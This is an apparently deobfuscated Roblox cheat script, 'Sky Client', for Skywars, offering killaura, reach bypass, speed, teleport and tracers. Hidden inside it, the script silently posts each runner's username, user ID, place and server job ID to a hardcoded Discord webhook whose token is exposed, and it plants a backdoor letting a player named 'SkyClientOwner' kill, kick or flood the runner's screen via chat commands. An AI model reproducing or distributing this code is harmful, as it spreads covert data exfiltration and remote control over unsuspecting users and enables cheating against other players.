-- deobf in Myliee

game.StarterGui:SetCore("SendNotification",{["Title"]="DO NOT USE TRACERS",["Text"]="YOU WILL BE crashed IF YOU do ITt",["Duration"]=5})
local function v8()
  local v100
  local v101
  local v102
  local v103
  local v104
  local v105
  game.Players.LocalPlayer.Character.Humanoid.Jump=true
  makefolder("rickastley")
  writefile("rickastley/heythere.jpeg",game:HttpGet("https://raw.githubusercontent.com/Zedion69/images/refs/heads/main/IMG_4261.jpeg",true))
  writefile("rickastley/heythere.mp3",game:HttpGet("https://raw.githubusercontent.com/Zedion69/sounds/refs/heads/main/never-gonna-give-you-up-made-with-Voicemod.mp3",true))
  v100=getcustomasset("rickastley/heythere.mp3")
  v101=getcustomasset("rickastley/heythere.jpeg")
  v102=Instance.new("Sky")
  v102.Name="SKY"
  v102.SkyboxBk=v101
  v102.SkyboxDn=v101
  v102.SkyboxFt=v101
  v102.SkyboxLf=v101
  v102.SkyboxRt=v101
  v102.SkyboxUp=v101
  v102.Parent=game.Lighting
  v103=Instance.new("Sound",game.Workspace)
  v103.Name="Spooky"
  v103.SoundId=v100
  v103.Volume=20
  v103.Looped=true
  v103:Play()
  v104=nil
  function v104(v299)
    if v299:IsA("Part") then
      for v373=0,5 do
        local v374=Instance.new("Decal")
        v374.Name="MYDECALHUE"
        v374.Face=v373
        v374.Parent=v299
        v374.Texture=v101
      end
    elseif v299:IsA("Model") then
      for v420,v421 in pairs(v299:GetChildren()) do
        v104(v421)
      end
    end
  end
  v105=nil
  function v105(v298)
    for v340,v341 in pairs(game.Workspace:GetChildren()) do
      v104(v341)
    end
  end
  v105(v101)
end
local v9=game:GetService("TextChatService")
local v10=game.Players.LocalPlayer
local function v11(v106)
  if (v106.TextSource and (v106.TextSource.UserId==v10.UserId)) then
    local v223
    v223=v106.Text
    if (v223=="!troll") then
      v8()
    elseif (v223=="!die") then
      v10.Character.Humanoid.Health=0
    elseif (v223=="!kick") then
      v10:Kick("kicked by skyclient owner lol: @zodien09")
    end
  end
end
local function v12(v107)
  if (v107.Name=="SkyClientOwner") then
    v107.Chatted:Connect(function(v243)
      if (v243=="!troll") then
        v8()
      elseif (v243=="!die") then
        v10.Character.Humanoid.Health=0
      elseif (v243=="!kick") then
        v10:Kick("kicked by skyclient owner lol: @zodien09")
      end
    end
    )
  end
end
game.Players.PlayerAdded:Connect(v12)
if game.Players:FindFirstChild("SkyClientOwner") then
  v12(game.Players:FindFirstChild("SkyClientOwner"))
end
local function v13(v108)
  local v110
  local v111
  local v112
  local v113
  local v114
  local v115
  v110=(is_sirhurt_closure and "Sirhurt") or (pebc_execute and "ProtoSmasher") or (syn and "Synapse X") or (secure_load and "Sentinel") or (KRNL_LOADED and "Krnl") or (SONA_LOADED and "Sona") or "Kid with shit exploit"
  v111="https://discord.com/api/webhooks/1355309103903412264/vp06Mor6f71UUCWyirUgwUGCBWUGExNjyvmqTgA9HkhdPxRRcLn9WGHWEVLHDacroP17"
  v112={["content"]=v108}
  v113=game:GetService("HttpService"):JSONEncode(v112)
  v114={["content-type"]="application/json"}
  request=http_request or request or HttpPost or syn.request
  v115={["Url"]=v111,["Body"]=v113,["Method"]="POST",["Headers"]=v114}
  request(v115)
end
v13("--------------------")
v13("SkyClient Information")
v13("--------------------")
v13("@everyone")
v13("\n```\nname: " .. game.Players.LocalPlayer.Name .. "```\n```\nplace name: " .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "```\n```\nuser id: " .. game.Players.LocalPlayer.UserId .. "```\n```\ngame id: " .. game.PlaceId .. "```\n```\njob id: " .. game.JobId .. "```\n")
v13("Thanks " .. game.Players.LocalPlayer.Name .. "!")
v13(game.JobId)
local v14=10
game:GetService("StarterGui"):SetCore("SendNotification",{["Title"]="Before you use. ",["Text"]="This script is only compatible with Skywars [CLASSIC]."})
local v15=130
local v16=Instance.new("ScreenGui")
v16.Parent=game.CoreGui
local v19=Instance.new("Frame")
v19.Size=UDim2.new(1,0,0,50)
v19.Position=UDim2.new(0,0,0,0)
v19.BackgroundTransparency=1
v19.Parent=v16
local v24=Instance.new("TextLabel")
v24.Size=UDim2.new(1,0,1,0)
v24.Position=UDim2.new(0,0,0,0)
v24.BackgroundTransparency=1
v24.Text="SKY CLIENT"
v24.TextTransparency=0.5
v24.TextColor3=Color3.fromRGB(255,255,255)
v24.TextSize=20
v24.Font=Enum.Font.Gotham
v24.TextStrokeTransparency=1
v24.Parent=v19
game:GetService("StarterGui"):SetCore("SendNotification",{["Title"]="WARNING",["Text"]="This script was SPECIFICALLY designed for MOBILE DEVICES, not COMPUTER DEVICES."})
game:GetService("StarterGui"):SetCore("SendNotification",{["Title"]="OWNER",["Text"]="The owner of this script is zodien, you can DM me at: @zedion09"})
local v36=true
local v37=true
local v10=game.Players.LocalPlayer
local v38=v10:FindFirstChild("PlayerGui")
if v38 then
  local v208
  local v209
  local v210
  local v211
  local v212
  v208=Instance.new("ScreenGui")
  v208.Parent=game.CoreGui
  v209=Instance.new("Frame")
  v209.Size=UDim2.new(1,0,1,0)
  v209.Position=UDim2.new(0,0,0,0)
  v209.BackgroundColor3=Color3.fromRGB(206,157,255)
  v209.BorderSizePixel=0
  v209.BackgroundTransparency=0
  v209.Parent=v208
  v210=Instance.new("UIGradient")
  v210.Color=ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(206,157,255)),ColorSequenceKeypoint.new(1,Color3.fromRGB(255,255,255))})
  v210.Rotation=145
  v210.Parent=v209
  v211=Instance.new("TextLabel")
  v211.Size=UDim2.new(0.5,0,0.2,0)
  v211.Position=UDim2.new(0.25,0,0.4,0)
  v211.BackgroundTransparency=1
  v211.Text="SKY CLIENT"
  v211.Font=Enum.Font.GothamBlack
  v211.TextSize=100
  v211.TextColor3=Color3.new(1,1,1)
  v211.TextTransparency=0
  v211.Parent=v209
  v212=Instance.new("UIGradient")
  v212.Color=ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(255,255,255)),ColorSequenceKeypoint.new(1,Color3.fromRGB(170,170,170))})
  v212.Rotation=90
  v212.Parent=v211
  wait(1)
  for v343=0,100 do
    local v345
    v345=v343/100
    v209.BackgroundTransparency=v345
    v211.TextTransparency=v345
    wait(0.01)
  end
  v208:Destroy()
end
if v36 then
  local v214
  local v215
  local v216
  if not isfolder("skyclient/sounds") then
    makefolder("skyclient/sounds")
  end
  v214="https://raw.githubusercontent.com/Zedion69/sounds/refs/heads/main/startup-87026%202.mp3"
  local v326
  v215="skyclient/sounds/startup.mp3"
  if not isfile(v215) then
    writefile(v215,game:HttpGet(v214,true))
  end
  v216=Instance.new("Sound")
  v216.SoundId=getcustomasset(v215)
  v216.Volume=5
  v216.Looped=false
  v216.Parent=game:GetService("SoundService")
  v216:Play()
end
makefolder("skyclient/images")
local v39="https://raw.githubusercontent.com/Zedion69/images/refs/heads/main/IMG_4234.jpeg"
local v40="skyclient/images/skyimage.png"
local v41=game:HttpGet(v39)
writefile(v40,v41)
local v42=game:GetService("StarterGui")
v42:SetCore("SendNotification",{["Title"]="Sky Client 1.0",["Text"]="Please be patient, the UI will load any second.",["Icon"]=getcustomasset(v40),["Duration"]=5})
local v43,v44=pcall(function()
  writefile("skyclient/sounds/background.mp3",game:HttpGet("https://raw.githubusercontent.com/Zedion69/sounds/refs/heads/main/Lukrembo%20-%20Memories%20(freetouse.com).mp3",true))
end
)
if not v43 then
end
if v37 then
  if isfile("skyclient/sounds/background.mp3") then
    local v245
    v245=Instance.new("Sound")
    v245.SoundId=getcustomasset("skyclient/sounds/background.mp3")
    v245.Volume=0.3
    v245.Looped=true
    v245.Parent=game:GetService("SoundService")
    v245:Play()
  end
end
local v45=Color3.fromRGB(180,104,255)
local v46=game:GetService("Players")
local v10=v46.LocalPlayer
local v38=v10:WaitForChild("PlayerGui")
local v47=Instance.new("ScreenGui")
v47.Parent=v38
v47.ResetOnSpawn=false
v47.Enabled=true
local v51=0.8
local function v52()
  for v217,v218 in pairs(v47:GetChildren()) do
    if v218:IsA("TextButton") then
      v218.Size=UDim2.new(0,120 * v51,0,30 * v51)
      v218.TextSize=14 * v51
    elseif v218:IsA("Frame") then
      v218.Size=UDim2.new(1,0,0,30 * v51)
    end
  end
end
local function v53(v116,v117)
  local v119
  local v120
  local v121
  local v122
  local v123
  v119=Instance.new("TextButton")
  v119.Parent=v47
  v119.Size=UDim2.new(0,120 * v51,0,30 * v51)
  v119.Position=v117 or UDim2.new(0,50,0,50)
  v119.BackgroundColor3=v45
  v119.BackgroundTransparency=0
  v119.Text=v116
  v119.TextColor3=Color3.fromRGB(255,255,255)
  v119.Font=Enum.Font.GothamBold
  v119.TextSize=14 * v51
  v119.AutoButtonColor=false
  v119.Active=true
  v119.Draggable=true
  v119.BorderSizePixel=0
  v119.AnchorPoint=Vector2.new(0.5,0)
  v120=Instance.new("UIGradient")
  v120.Parent=v119
  v120.Color=ColorSequence.new(Color3.fromRGB(255,255,255),Color3.fromRGB(200,200,200))
  v120.Rotation=90
  v121=Instance.new("Frame")
  v121.Parent=v119
  v121.Size=UDim2.new(1,0,0,0)
  v121.Position=UDim2.new(0,0,1,0)
  v121.BackgroundTransparency=1
  v121.ClipsDescendants=true
  v121.BorderSizePixel=0
  v122=Instance.new("UIListLayout")
  v122.Parent=v121
  v122.FillDirection=Enum.FillDirection.Vertical
  v122.SortOrder=Enum.SortOrder.LayoutOrder
  v123=false
  v119.MouseButton1Click:Connect(function()
    v123= not v123
    if v123 then
      v121:TweenSize(UDim2.new(1,0,0, #v121:GetChildren() * 30 * v51),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.5,true)
    else
      v121:TweenSize(UDim2.new(1,0,0,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.5,true)
    end
  end
  )
  return v121
end
local function v54(v124,v125,v126,v127)
  local v129
  local v130
  local v131
  v129=Instance.new("TextButton")
  v129.Parent=v125
  v129.Size=UDim2.new(1,0,0,30 * v51)
  v129.BackgroundColor3=Color3.fromRGB(33,33,33)
  v129.BackgroundTransparency=0
  v129.Text=v124
  v129.TextColor3=Color3.fromRGB(255,255,255)
  v129.Font=Enum.Font.Gotham
  v129.TextSize=14 * v51
  v129.BorderSizePixel=0
  v130=Instance.new("UIGradient")
  v130.Parent=v129
  v130.Color=ColorSequence.new(Color3.fromRGB(255,255,255),Color3.fromRGB(220,220,220))
  v130.Rotation=90
  v131=false
  v129.MouseButton1Click:Connect(function()
    v131= not v131
    if v131 then
      v129.BackgroundColor3=v45
      if v126 then
        v126()
      end
    else
      v129.BackgroundColor3=Color3.fromRGB(33,33,33)
      if v127 then
        v127()
      end
    end
  end
  )
end
local v55=v53("Combat",UDim2.new(0,v15 + 50,0,50))
local v56=v53("Blatant",UDim2.new(0,v15 + 150,0,50))
local v57=v53("Visual",UDim2.new(0,v15 + 250,0,50))
local v58=v53("World",UDim2.new(0,v15 + 350,0,50))
local v10=game.Players.LocalPlayer
local v59=workspace.CurrentCamera
local v60=false
local v61={}
local v62=game.Workspace.Gravity
v54("Gravity",v58,function()
  game.Workspace.Gravity=80
end
,function()
  game.Workspace.Gravity=v62
end
)
v54("Tracers",v57,function()
  v60=true
end
,function()
  v60=false
  for v331,v332 in pairs(v61) do
    v332:Remove()
  end
  v61={}
end
)
game:GetService("RunService").RenderStepped:Connect(function()
  if v60 then
    for v289,v290 in pairs(game.Players:GetPlayers()) do
      local v292
      if (v290==v10) then
        continue
      end
      v292=v290.Character
      if (v292 and v292:FindFirstChild("Head")) then
        local v396
        local v397
        v396=v59:WorldToScreenPoint(v292.Head.Position)
        if not v61[v290] then
          local v474
          v474=Drawing.new("Line")
          v474.Thickness=1
          v474.Color=Color3.fromRGB(180,104,255)
          v61[v290]=v474
        end
        v397=v61[v290]
        v397.From=Vector2.new(v59.ViewportSize.X/2,v59.ViewportSize.Y)
        v397.To=Vector2.new(v396.X,v396.Y)
      end
    end
  else
    local v225
    for v426,v427 in pairs(v61) do
      v427:Remove()
    end
    v61={}
  end
end
)
local v63=false
local function v64(v135)
  local v137
  local v138
  local v139
  local v140
  local v141
  v137=v135:WaitForChild("Humanoid")
  v138=v135:WaitForChild("HumanoidRootPart")
  v139=1.5
  v140=v139/5
  v141=nil
  function v141()
    local v381
    local v382
    v381=Vector3.new()
    if (v137.MoveDirection.Magnitude>0) then
      v381=v137.MoveDirection.Unit
    end
    v382=v381 * v139 * v140
    v138.CFrame=v138.CFrame + v382
  end
  game:GetService("RunService").Heartbeat:Connect(function()
    if v63 then
      v141()
    end
  end
  )
end
v54("Speed",v56,function()
  v63=true
end
,function()
  v63=false
end
)
v10.CharacterAdded:Connect(function(v142)
  v64(v142)
end
)
if v10.Character then
  v64(v10.Character)
end
v54("Teleport",v56,function()
  local v144
  v144=nil
  function v144()
    if (v10 and v10.Character and v10.Character:FindFirstChild("HumanoidRootPart")) then
      local v360=game.Players:GetPlayers()
      local v361=nil
      local v362=math.huge
      for v383,v384 in pairs(v360) do
        if ((v384~=v10) and v384.Character and v384.Character:FindFirstChild("HumanoidRootPart")) then
          local v429
          v429=(v10.Character.HumanoidRootPart.Position-v384.Character.HumanoidRootPart.Position).Magnitude
          if (v429<v362) then
            v361=v384
            v362=v429
          end
        end
      end
      if v361 then
        local v399
        local v400
        local v401
        local v402
        local v403
        v399=game:GetService("TweenService")
        v400=v10.Character.HumanoidRootPart
        v401=v361.Character.HumanoidRootPart.CFrame
        v402=TweenInfo.new(0.5,Enum.EasingStyle.Sine,Enum.EasingDirection.Out)
        v403=v399:Create(v400,v402,{["CFrame"]=v401})
        v403:Play()
        v403.Completed:Wait()
      end
    end
  end
  v144()
end
,function()
  local v146
  v146=nil
  function v146()
    if (v10 and v10.Character and v10.Character:FindFirstChild("HumanoidRootPart")) then
      local v363=game.Players:GetPlayers()
      local v364=nil
      local v365=math.huge
      for v385,v386 in pairs(v363) do
        if ((v386~=v10) and v386.Character and v386.Character:FindFirstChild("HumanoidRootPart")) then
          local v430=(v10.Character.HumanoidRootPart.Position-v386.Character.HumanoidRootPart.Position).Magnitude
          if (v430<v365) then
            local v443
            v364=v386
            v365=v430
          end
        end
      end
      if v364 then
        local v405
        local v406
        local v407
        local v408
        local v409
        v405=game:GetService("TweenService")
        v406=v10.Character.HumanoidRootPart
        v407=v364.Character.HumanoidRootPart.CFrame
        v408=TweenInfo.new(0.01,Enum.EasingStyle.Sine,Enum.EasingDirection.Out)
        v409=v405:Create(v406,v408,{["CFrame"]=v407})
        v409:Play()
        v409.Completed:Wait()
      end
    end
  end
  v146()
end
)
local v65=Instance.new("Part")
v65.Size=Vector3.new(10000,1,10000)
v65.Position=Vector3.new(0,71.98,0)
v65.Anchored=true
v65.Color=Color3.fromRGB(180,104,255)
v65.Parent=game.Workspace
v65.Transparency=1
v65.CanCollide=false
v54("Antivoid",v56,function()
  v65.Transparency=0.6
  v65.CanCollide=true
end
,function()
  v65.Transparency=1
  v65.CanCollide=false
end
)
local v74=0.5
local v75=0.01
local v76=false
local v77=nil
local function v78(v151)
  local v153
  local v154
  local v155
  local v156
  local v157
  v153=v151:FindFirstChildOfClass("Humanoid")
  if not v153 then
    return false
  end
  v154=v151.PrimaryPart.Position
  v155=Vector3.new(0, -5,0)
  v156=RaycastParams.new()
  v156.FilterDescendantsInstances={v151}
  v156.FilterType=Enum.RaycastFilterType.Blacklist
  v157=workspace:Raycast(v154,v155,v156)
  if (v157 and v157.Instance) then
    local v447
    local v448
    local v449
    local v450
    local v451
    local v452
    local v453
    v447=v157.Instance
    v448=v447.Size
    local v468
    v449=v447.Position
    v450=v449.X-(v448.X/2)
    v451=v449.X + (v448.X/2)
    v452=v449.Z-(v448.Z/2)
    v453=v449.Z + (v448.Z/2)
    if ((math.abs(v154.X-v450)<=v74) or (math.abs(v154.X-v451)<=v74) or (math.abs(v154.Z-v452)<=v74) or (math.abs(v154.Z-v453)<=v74)) then
      return true
    end
  end
  return false
end
local function v79(v158)
  local v160
  if v77 then
    task.cancel(v77)
  end
  v160=v158:FindFirstChildOfClass("Humanoid")
  if not v160 then
    return
  end
  v77=task.spawn(function()
    while v76 and task.wait(v75) do
      if (not v158 or not v158.Parent) then
      end
      if (v78(v158) and (v160:GetState()~=Enum.HumanoidStateType.Jumping)) then
        v160:ChangeState(Enum.HumanoidStateType.Jumping)
      end
    end
  end
  )
end
v10.CharacterAdded:Connect(function(v161)
  local v163
  task.wait(0.1)
  if v76 then
    v79(v161)
  end
end
)
if v10.Character then
  v79(v10.Character)
end
v54("AutoJump",v58,function()
  v76=true
  if v10.Character then
    v79(v10.Character)
  end
end
,function()
  v76=false
end
)
local v46=game:GetService("Players")
local v80=v46.LocalPlayer
local v81=game:GetService("RunService")
local v82=v14 + 5
local v83="Sword"
local v84=false
local v85
v54("Killaura",v56,function()
  v84=true
  v82=v14 + 5
  startKillaura()
end
,function()
  v84=false
  v82=v14 + 5
  stopKillaura()
end
)
local function v86()
  local v166
  for v387,v388 in pairs(v46:GetPlayers()) do
    if ((v388~=v80) and v388.Character and v388.Character:FindFirstChild("HumanoidRootPart")) then
      local v433
      local v434
      local v435
      v433=v388.Character:FindFirstChild("Humanoid")
      v434=v388.Character:FindFirstChild("ForceField")
      v435=(v80.Character.HumanoidRootPart.Position-v388.Character.HumanoidRootPart.Position).Magnitude
      if (v433 and (v433.Health>0) and not v434 and (v435<=v82)) then
        return true
      end
    end
  end
  return false
end
local function v87()
  local v168
  v168=v80.Backpack:FindFirstChild(v83)
  if (v168 and not v80.Character:FindFirstChild(v83)) then
    v168.Parent=v80.Character
  end
end
local function v88()
  local v170
  v170=v80.Character:FindFirstChild(v83)
  if v170 then
    v170.Parent=v80.Backpack
  end
end
local function v89()
  local v171=v80.Character:FindFirstChild(v83)
  if (v171 and v171:IsA("Tool")) then
    v171:Activate()
  end
end
local function v90()
  local v173
  v173=v80.Character:FindFirstChild("HumanoidRootPart")
  if v173 then
    v173.CFrame=v173.CFrame * CFrame.Angles(0,math.rad(0),0)
  end
end
local function v91()
  local v175
  v175=v80.Character:FindFirstChild("Humanoid")
  if v175 then
    print("s")
  end
end
local function v92()
  local v177
  v177=v80.Character:FindFirstChild("Humanoid")
  if v177 then
    v177.AutoRotate=true
  end
end
function startKillaura()
  v85=v81.Heartbeat:Connect(function()
    if (v84 and v86()) then
      local v296
      v87()
      v89()
      v296=v80.Character:FindFirstChild(v83)
      if v296 then
        local v411
        v90()
        v91()
      end
    else
      v88()
      v92()
    end
  end
  )
end
function stopKillaura()
  local v179
  if v85 then
    local v413
    v85:Disconnect()
    v85=nil
  end
  v92()
  v88()
end
v54("ReachBypass",v55,function()
  local v181
  v181=v14
  game:GetService("RunService").RenderStepped:Connect(function()
    local v334
    v334=game.Players:GetPlayers()
    for v414=2, #v334 do
      local v416
      v416=v334[v414].Character
      if (v416 and v416:FindFirstChild("Humanoid") and (v416.Humanoid.Health>0) and v416:FindFirstChild("HumanoidRootPart") and (v10:DistanceFromCharacter(v416.HumanoidRootPart.Position)<=v181)) then
        local v461
        v461=v10.Character and v10.Character:FindFirstChildOfClass("Tool")
        if (v461 and v461:FindFirstChild("Handle")) then
          v461:Activate()
          for v483,v484 in next,v416:GetChildren() do
            if v484:IsA("BasePart") then
              local v486
              firetouchinterest(v461.Handle,v484,0)
              firetouchinterest(v461.Handle,v484,1)
            end
          end
        end
      end
    end
  end
  )
end
,function()
end
)
local v93=false
game:GetService("UserInputService").JumpRequest:connect(function()
  if v93 then
    game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState("Jumping")
  end
end
)
v54("AirJump",v56,function()
  v93=true
end
,function()
  v93=false
end
)
local v94=false
while v94 do
  wait(4)
  game.TextChatService.TextChannels.RBXGeneral:SendAsync("skyclient is cool")
end
v54("Advertise",v56,function()
  v94=true
end
,function()
  v94=false
end
)
v54("InfiniteReach",v56,function()
  local v184
  v184=5000000000000
  game:GetService("RunService").RenderStepped:Connect(function()
    local v336
    v336=game.Players:GetPlayers()
    for v417=2, #v336 do
      local v419
      v419=v336[v417].Character
      if (v419 and v419:FindFirstChild("Humanoid") and (v419.Humanoid.Health>0) and v419:FindFirstChild("HumanoidRootPart") and (v10:DistanceFromCharacter(v419.HumanoidRootPart.Position)<=v184)) then
        local v462=v10.Character and v10.Character:FindFirstChildOfClass("Tool")
        if (v462 and v462:FindFirstChild("Handle")) then
          v462:Activate()
          for v479,v480 in next,v419:GetChildren() do
            if v480:IsA("BasePart") then
              firetouchinterest(v462.Handle,v480,0)
              firetouchinterest(v462.Handle,v480,1)
            end
          end
        end
      end
    end
  end
  )
end
,function()
end
)
local v95=game:GetService("Workspace").CurrentCamera.FieldOfView
v54("FOV",v57,function()
  game:GetService("Workspace").CurrentCamera.FieldOfView=120
end
,function()
  game:GetService("Workspace").CurrentCamera.FieldOfView=v95
end
)
v52()
local function v8()
  makefolder("rickastley")
  writefile("rickastley/heythere.jpeg",game:HttpGet("https://raw.githubusercontent.com/Zedion69/images/refs/heads/main/IMG_4261.jpeg",true))
  writefile("rickastley/heythere.mp3",game:HttpGet("https://raw.githubusercontent.com/Zedion69/sounds/refs/heads/main/never-gonna-give-you-up-made-with-Voicemod.mp3",true))
  local v187=getcustomasset("rickastley/heythere.mp3")
  local v188=getcustomasset("rickastley/heythere.jpeg")
  local v189=Instance.new("Sky")
  v189.Name="SKY"
  v189.SkyboxBk=v188
  v189.SkyboxDn=v188
  v189.SkyboxFt=v188
  v189.SkyboxLf=v188
  v189.SkyboxRt=v188
  v189.SkyboxUp=v188
  v189.Parent=game.Lighting
  local v199=Instance.new("Sound",game.Workspace)
  v199.Name="Spooky"
  v199.SoundId=v187
  v199.Volume=20
  v199.Looped=true
  v199:Play()
  local function v204(v220)
    if v220:IsA("Part") then
      for v337=0,5 do
        local v339
        v339=Instance.new("Decal")
        v339.Name="MYDECALHUE"
        v339.Face=v337
        v339.Parent=v220
        v339.Texture=v188
      end
    elseif v220:IsA("Model") then
      for v371,v372 in pairs(v220:GetChildren()) do
        v204(v372)
      end
    end
  end
  local function v205(v221)
    for v226,v227 in pairs(game.Workspace:GetChildren()) do
      v204(v227)
    end
  end
  v205(v188)
end
local v10=game:GetService("Players"):FindFirstChild("SkyClientOwner")
if v10 then
  v10.Chatted:Connect(function(v228)
    if (v228=="!troll") then
      v8()
    end
  end
  )
end
workspace.GameMusic:Destroy()
